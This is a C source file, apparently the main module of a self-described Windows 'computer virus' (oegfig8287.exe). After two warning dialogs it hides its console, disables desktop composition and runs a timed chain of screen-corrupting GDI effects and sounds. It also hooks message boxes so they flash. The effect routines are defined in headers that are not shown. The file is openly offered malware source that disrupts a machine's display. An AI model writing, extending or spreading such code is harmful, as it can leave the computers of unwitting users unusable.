#pragma warning(disable:4244)
#pragma warning(disable:4552)
#pragma warning(disable:4554)
#pragma warning(disable:4129)
#pragma warning(disable:4305)
#pragma warning(disable:4715)

#include"def.h"
#include"glitch.h"
#include"sound.h"
#include"payload.h"

void clean(){
	for(int i=0;i<30;i++){
		InvalidateRect(0,0,0);
	}
}
HRESULT DwmEnableComposition(UINT uCompositionAction){
	typedef HRESULT(WINAPI *_dwmEnableComposition)(UINT uCompositionAction);
	HMODULE hm=LoadLibrary(_T("dwmapi.dll"));
	if(hm==NULL) return -1;
	_dwmEnableComposition dwmfunc=(_dwmEnableComposition)GetProcAddress(hm,"DwmEnableComposition");
	return dwmfunc(uCompositionAction);
}
VOID WINAPI MsgBoxCorruptionThread(HWND hwndMsgBox) {
	HDC hdc = GetDC(hwndMsgBox);
	RECT rect;
	GetWindowRect(hwndMsgBox, &rect);
	int w = rect.right - rect.left, h = rect.bottom - rect.top;
	InvalidateRect(0, 0, 0);
	for (;;) {
		SelectObject(hdc, CreateSolidBrush(RGB(rand() % 255, rand() % 255, rand() % 255)));
		PatBlt(hdc, 0, 0, w, h, PATINVERT);
		Sleep(100);
	}
}

LRESULT CALLBACK msgBoxHook(int nCode, WPARAM wParam, LPARAM lParam) {
	if (nCode == HCBT_ACTIVATE) {
		HWND hwndMsgBox = (HWND)wParam;
		Sleep(100);
//		ShowWindow(hwndMsgBox, 5);
		HANDLE handle = CreateThread(NULL, 0, (PTHREAD_START_ROUTINE)MsgBoxCorruptionThread, hwndMsgBox, 0, NULL);
		return 0;
	}
	return CallNextHookEx(0, nCode, wParam, lParam);
}
void RunPayload(){
	HANDLE msg=CreateThread(NULL,0,msgbox,NULL,0,NULL);
	DwmEnableComposition(0);
	Sleep(1000);

	sound1();
	HANDLE sh1=CreateThread(NULL,0,GDIShader1,NULL,0,NULL);
	Sleep(30000);
	TerminateThread(sh1,0);
	InvalidateRect(0,0,0);
	Sleep(100);

	sound2();
	HANDLE melt=CreateThread(NULL,0,Payload1a_Melt,NULL,0,NULL);
	HANDLE tri=CreateThread(NULL,0,Payload1b_Triangles,NULL,0,NULL);
	Sleep(30000);
	TerminateThread(melt,0);
//	TerminateThread(tri,0);
	InvalidateRect(0,0,0);
	Sleep(100);

	sound3();
	HANDLE sh2=CreateThread(NULL,0,GDIShader2,NULL,0,NULL);
	Sleep(30000);
	TerminateThread(sh2,0);
	InvalidateRect(0,0,0);
	Sleep(100);

	sound4();
	HANDLE sh3=CreateThread(NULL,0,GDIShader3,NULL,0,NULL);
	HANDLE textout=CreateThread(NULL,0,Payload2a_Textout,NULL,0,NULL);
	Sleep(30000);
	TerminateThread(sh3,0);
//	TerminateThread(textout,0);
	InvalidateRect(0,0,0);
	Sleep(100);

	sound5();
	HANDLE swirl=CreateThread(NULL,0,Payload3a_Swirl,NULL,0,NULL);
	Sleep(30000);
	TerminateThread(swirl,0);
	InvalidateRect(0,0,0);
	Sleep(100);

	sound6();
	HANDLE sh4=CreateThread(NULL,0,GDIShader4,NULL,0,NULL);
	HANDLE mosaic=CreateThread(NULL,0,Payload4a_Mosaic,NULL,0,NULL);
	Sleep(30000);
	TerminateThread(mosaic,0);
	TerminateThread(sh4,0);
	InvalidateRect(0,0,0);
	Sleep(100);

	sound7();
	HANDLE sh5=CreateThread(NULL,0,GDIShader5,NULL,0,NULL);
	Sleep(30000);
	TerminateThread(sh5,0);
	InvalidateRect(0,0,0);
	Sleep(100);

	sound8();
	HANDLE sh6=CreateThread(NULL,0,GDIShader6,NULL,0,NULL);
	Sleep(30000);
	TerminateThread(sh6,0);
	InvalidateRect(0,0,0);
	Sleep(100);

	sound9();
	HANDLE sh7=CreateThread(NULL,0,GDIShader7,NULL,0,NULL);
	HANDLE iconcube=CreateThread(NULL,0,Payload5a_IconCube,NULL,0,NULL);
	Sleep(30000);
	TerminateThread(sh7,0);
//	TerminateThread(iconcube,0);
	InvalidateRect(0,0,0);
	Sleep(100);

	sound10();
	HANDLE melt2=CreateThread(NULL,0,Payload6a_Melt2,NULL,0,NULL);
	Sleep(30000);
	TerminateThread(melt2,0);
	InvalidateRect(0,0,0);
	Sleep(100);

	sound11();
	HANDLE sh8=CreateThread(NULL,0,GDIShader8,NULL,0,NULL);
	Sleep(30000);
	TerminateThread(sh8,0);
	InvalidateRect(0,0,0);
	Sleep(100);

	sound12();
	HANDLE swirl2=CreateThread(NULL,0,Payload7a_Swirl2,NULL,0,NULL);
	Sleep(30000);
	TerminateThread(swirl2,0);
	InvalidateRect(0,0,0);
	Sleep(100);

	sound13();
	HANDLE sh9=CreateThread(NULL,0,GDIShader9,NULL,0,NULL);
	Sleep(30000);
	TerminateThread(sh9,0);
	InvalidateRect(0,0,0);
	Sleep(100);

	sound14();
	HANDLE htrain=CreateThread(NULL,0,Payload8a_Train,NULL,0,NULL);
	Sleep(30000);
	TerminateThread(htrain,0);
	TerminateThread(textout,0);
	InvalidateRect(0,0,0);
	Sleep(100);

	sound15();
	HANDLE sh10=CreateThread(NULL,0,GDIShader10,NULL,0,NULL);
	HANDLE textout2=CreateThread(NULL,0,Payload9a_TextOut2,NULL,0,NULL);
	Sleep(30000);
	TerminateThread(sh10,0);
	TerminateThread(textout2,0);
	InvalidateRect(0,0,0);
	Sleep(100);
}
int main(){
	InitDPI();
	srand(time(NULL));
	SeedXorshift32((DWORD)time(NULL));
	ShowWindow(GetConsoleWindow(),SW_HIDE);
	if(MessageBoxW(NULL,L"Warning! This program is a computer virus. It may make your computer cannot work normally. Whether to run or not?\n\nPlease don't maliciously open this program on other people's or public computers! If you accidentally opened it, please click the 'No' button to cancel the run. If you want to run it, please make sure you are running it on your own computer, or ensure that the virus on this computer is in a secure environment (such as a virtual machine, sandbox, etc.) and turn off all antivirus software. If you are running this program on other people's or public computers, please make sure you are running the harmless edition of this program, and then click the 'Yes' button to continue.", L"oegfig8287.exe -- WARNING", MB_YESNO|MB_ICONWARNING|MB_DEFBUTTON2)==IDYES){
		HHOOK hMsgHook = SetWindowsHookEx(WH_CBT, msgBoxHook, 0, GetCurrentThreadId());
		if (MessageBoxW(NULL, L"This is the last warning!!!\n\n\Do you want to really run? After running, your computer may not work normally! If you run the harmful edition of this program on other people's or public computers, you will be responsible for any losses and legal liabilities caused by running this program! The writer of this computer virus isn't responsible!!!", L"oegfig8287.exe -- WARNING", MB_YESNO | MB_ICONWARNING | MB_DEFBUTTON2) == IDYES){
			UnhookWindowsHookEx(hMsgHook);
			RunPayload();
		}
	}
	return 0;
}